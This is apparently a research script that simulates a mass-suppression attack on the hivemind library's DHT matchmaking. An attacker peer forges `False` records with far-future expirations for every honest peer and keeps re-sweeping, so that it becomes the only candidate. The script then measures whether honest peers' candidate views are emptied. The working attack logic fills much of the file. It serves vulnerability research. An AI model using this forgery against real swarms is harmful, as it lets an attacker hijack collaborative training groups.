"""Does suppressing every honest advertiser hand the attacker the group?

step20 forged ONE peer, picked from the attacker's first usable read, and captured
0/10. HANDOFF section 4.12 gives the reason: suppression is one-directional. A peer
hidden from other peers' candidate lists can still read the key itself, still see
the victim, and still ask to join. Hiding H from the victim does not hide the
victim from H.

This tests the version that does not have that hole:

  * forge `False` for EVERY honest peer the attacker has ever seen, not one
  * repeat the sweep continuously, so a peer that advertises later is suppressed
    within one poll instead of being missed
  * use a far-future expiration, so the victim's own `now + min_matchmaking_time`
    re-declaration can never win the record back (storage.py:60)
  * advertise the attacker normally throughout, so when the victim's candidate
    list is emptied of honest peers the attacker is the only thing left in it

If that works, it reproduces section 4.6's blinding result with **zero crafted DHT
identities** -- blinding needed about `bucket_size` of them -- and with no timing
race, which is what defeated the undercutting attack.

Gate first, capture second. The cheap question is whether the victim's candidate
view is ever emptied of honest peers; if it is not, nothing downstream matters and
no capture run is justified. HANDOFF section 4.12 is explicit that settling capture
needs ~20 runs per arm at this swarm size, not 3, because the variance exceeds any
effect the forgery could plausibly have.

Arms:
    control     attacker advertises normally, forges nothing
    suppress    attacker advertises normally and suppresses everyone it sees

Run:
    .venv/bin/python research/step21_mass_suppression.py --phase gate
    .venv/bin/python research/step21_mass_suppression.py --phase confirm --repeats 20
"""

from __future__ import annotations

import argparse
import asyncio
import csv
import json
import math
import multiprocessing as mp
import time
from datetime import datetime, timezone
from pathlib import Path

import step19_wan_delay_leader as wan

from hivemind.averaging.key_manager import GroupKeyManager
from hivemind.averaging.matchmaking import PotentialLeaders
from hivemind.utils.timed_storage import get_dht_time

baseline = wan.baseline
RESULTS = Path(__file__).resolve().parent / "results"
ARMS = ("control", "suppress")
ATTACK_ARM = "control"

# Far enough ahead that an honest `now + min_matchmaking_time` re-declaration can
# never exceed it, so the suppression is permanent for the run rather than a race.
FORGE_SECONDS = 3600.0
SWEEP_INTERVAL = 0.25

_ORIGINAL_GET_AVERAGERS = GroupKeyManager.get_averagers


async def _observed_averagers(self: GroupKeyManager, group_key: str, only_active: bool):
    """Record what each peer's candidate list actually contained. This is the gate."""
    found = await _ORIGINAL_GET_AVERAGERS(self, group_key, only_active)
    if baseline.CURRENT_ROUND is not None and baseline.CURRENT_ROUND.value >= 0 and only_active:
        baseline._record(
            "candidate_view",
            self.peer_id,
            group_key,
            {"candidates": [[str(peer), expiration] for peer, expiration in found]},
        )
    return found


async def _declare_and_suppress(self: PotentialLeaders, step, key_manager: GroupKeyManager):
    """Attacker: advertise honestly, and keep every other advertiser suppressed."""
    if not baseline.STRATEGY_THIS_PROCESS:
        return await baseline._ORIGINAL_DECLARE(self, step, key_manager)

    suppressed: set[bytes] = set()

    # Peers the attacker already knows about. In a real run this is simply the
    # roster it saw in earlier epochs; reacting to the current round is too slow,
    # because a group assembles in about the time one DHT read takes.
    known: list = []
    if wan.PEER_REGIONS is not None:
        from hivemind.p2p import PeerID

        known = [PeerID.from_base58(p) for p in wan.PEER_REGIONS.keys() if p != str(self.peer_id)]
    baseline._record(
        "roster", self.peer_id, "", {"known_peers": len(known), "arm": ATTACK_ARM}
    )

    async def forge(peer) -> None:
        started = time.perf_counter()
        try:
            accepted = bool(
                await key_manager.dht.store(
                    key=key_manager.current_key,
                    subkey=peer.to_bytes(),
                    value=False,
                    expiration_time=get_dht_time() + FORGE_SECONDS,
                    return_future=True,
                )
            )
            error = ""
        except Exception as exc:
            accepted, error = False, type(exc).__name__
        if accepted:
            suppressed.add(peer.to_bytes())
        baseline._record(
            "forgery", self.peer_id, peer,
            {"accepted": accepted, "error": error,
             "write_latency_s": time.perf_counter() - started},
        )

    async with self.lock_declare:
        try:
            # Suppress the whole known roster before anything else, concurrently.
            if ATTACK_ARM == "suppress" and known:
                await asyncio.gather(*(forge(peer) for peer in known))

            while get_dht_time() < self.search_end_time:
                await self.running.wait()
                group_key = key_manager.current_key

                # Our own advertisement is ordinary: no undercut, no forged deadline.
                declared = float(
                    min(
                        max(step.scheduled_time, get_dht_time() + self.min_matchmaking_time),
                        self.search_end_time,
                    )
                )
                self.declared_group_key = group_key
                self.declared_expiration_time = declared
                self.declared_expiration.set()
                own_started = time.perf_counter()
                try:
                    own_accepted = bool(
                        await key_manager.declare_averager(group_key, self.peer_id, expiration_time=declared)
                    )
                    own_error = ""
                except Exception as exc:
                    own_accepted, own_error = False, type(exc).__name__
                baseline._record(
                    "attacker_publication",
                    self.peer_id,
                    group_key,
                    {
                        "accepted": own_accepted,
                        "error": own_error,
                        "declared_expiration": declared,
                        "write_latency_s": time.perf_counter() - own_started,
                        "arm": ATTACK_ARM,
                    },
                )

                # Sweep until our own advertisement expires, then re-declare.
                while get_dht_time() < declared and get_dht_time() < self.search_end_time:
                    read_started = time.perf_counter()
                    try:
                        seen = await key_manager.get_averagers(group_key, only_active=True)
                        read_error = ""
                    except Exception as exc:
                        seen, read_error = [], type(exc).__name__
                    others = [
                        (peer, expiration)
                        for peer, expiration in seen
                        if peer != self.peer_id and math.isfinite(expiration)
                    ]
                    baseline._record(
                        "attacker_read",
                        self.peer_id,
                        group_key,
                        {
                            "read_latency_s": time.perf_counter() - read_started,
                            "seen_count": len(seen),
                            "other_count": len(others),
                            "read_error": read_error,
                            "suppressed_so_far": len(suppressed),
                        },
                    )

                    if ATTACK_ARM == "suppress":
                        # Re-forge anyone visible again (they re-declared), plus any
                        # roster peer not yet confirmed suppressed.
                        targets = {peer.to_bytes(): peer for peer, _ in others}
                        for peer in known:
                            if peer.to_bytes() not in suppressed:
                                targets.setdefault(peer.to_bytes(), peer)
                        if targets:
                            await asyncio.gather(*(forge(peer) for peer in targets.values()))

                    await asyncio.sleep(SWEEP_INTERVAL)

                if self.running.is_set() and len(self.leader_queue) == 0:
                    await key_manager.update_key_on_not_enough_peers()
        finally:
            if self.declared_group_key is not None:
                previous_key, previous_expiration = self.declared_group_key, self.declared_expiration_time
                self.declared_group_key, self.declared_expiration_time = None, float("inf")
                self.leader_queue, self.max_assured_time = type(self.leader_queue)(), float("-inf")
                await key_manager.declare_averager(
                    previous_key, self.peer_id, previous_expiration, looking_for_group=False
                )


GroupKeyManager.get_averagers = _observed_averagers
PotentialLeaders._declare_averager_periodically = _declare_and_suppress


def analyse(rows: list[dict], events: list[dict]) -> dict:
    """The gate: was any honest peer's candidate view ever emptied of honest peers?"""
    attacker = {row.get("attacker_id") for row in rows}
    views = [e for e in events if e["kind"] == "candidate_view"]
    emptied, total, nonempty, saw_honest = 0, 0, 0, 0
    for event in views:
        if event["peer"] in attacker:
            continue
        total += 1
        candidates = json.loads(event["detail"])["candidates"]
        honest = [peer for peer, _ in candidates if peer not in attacker]
        if candidates:
            nonempty += 1
            if honest:
                saw_honest += 1
            else:
                emptied += 1
    forgeries = [json.loads(e["detail"]) for e in events if e["kind"] == "forgery"]
    return {
        "honest_views": total,
        "nonempty_views": nonempty,
        "views_showing_an_honest_peer": saw_honest,
        "views_with_no_honest_candidate": emptied,
        "forgeries_attempted": len(forgeries),
        "forgeries_accepted": sum(1 for f in forgeries if f["accepted"]),
    }


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--phase", choices=("gate", "confirm"), default="gate")
    parser.add_argument("--repeats", type=int, default=1)
    parser.add_argument("--seed", type=int, default=2101)
    parser.add_argument("--fillers", type=int, default=23)
    parser.add_argument("--region", default="SE", choices=wan.REGIONS)
    parser.add_argument("--schedule-min", type=float, default=11.0)
    parser.add_argument("--schedule-max", type=float, default=15.0)
    parser.add_argument("--jitter", type=float, default=0.3)
    parser.add_argument("--arms", nargs="+", default=list(ARMS), choices=ARMS)
    parser.add_argument("--label", default="")
    args = parser.parse_args()

    global ATTACK_ARM
    label = args.label or datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    all_rows, all_events = [], []

    # step19's main() normally does this; we drive run_trial directly, so load the
    # RTT profile and the shared region map ourselves.
    wan.RTT_MS, profile_data = wan.load_profile(wan.DEFAULT_PROFILE)
    print(f"profile {profile_data['collected_at_utc']} · attacker in {args.region} · "
          f"window {args.schedule_min}-{args.schedule_max}s · jitter {args.jitter}s", flush=True)

    manager = mp.Manager()
    wan.PEER_REGIONS = manager.dict()

    for repeat in range(args.repeats):
        seed = args.seed + repeat
        for arm in args.arms:
            ATTACK_ARM = arm
            baseline.STRATEGY_THIS_PROCESS = "suppress"
            row, events = wan.run_trial(
                arm="late",
                scale=1.0,
                round_id=0,
                seed=seed,
                fillers=args.fillers,
                label=f"{label}_{arm}_s{seed}",
                key_label=f"s21_{seed}",
                attacker_region=args.region,
                safety_margin=0.0,
                observation_window=0.0,
                jitter=args.jitter,
                schedule_min=args.schedule_min,
                schedule_max=args.schedule_max,
            )
            row["arm"], row["seed"], row["repeat"] = arm, seed, repeat
            for event in events:
                event["arm"], event["seed"], event["repeat"] = arm, seed, repeat
            summary = analyse([row], events)
            row.update(summary)
            all_rows.append(row)
            all_events.extend(events)
            print(
                f"  {arm:<9} seed={seed}  led={row.get('attacker_led')}  "
                f"followers={row.get('follower_count')}  honest_ok={row.get('honest_completed')}  "
                f"attacker_only={summary['views_with_no_honest_candidate']}/{summary['nonempty_views']} views  "
                f"forged={summary['forgeries_accepted']}/{summary['forgeries_attempted']}"
            )

    wan.PEER_REGIONS = None
    manager.shutdown()

    RESULTS.mkdir(exist_ok=True)
    tag = f"{args.phase}_{label}_f{args.fillers}_r{args.repeats}_s{args.seed}_j{args.jitter:g}"
    wan.write_csv(RESULTS / f"step21_suppression_rounds_{tag}.csv", all_rows)
    wan.write_csv(RESULTS / f"step21_suppression_events_{tag}.csv", all_events)
    print(f"\nwrote step21_suppression_{{rounds,events}}_{tag}.csv")


if __name__ == "__main__":
    mp.set_start_method("fork", force=True)
    main()
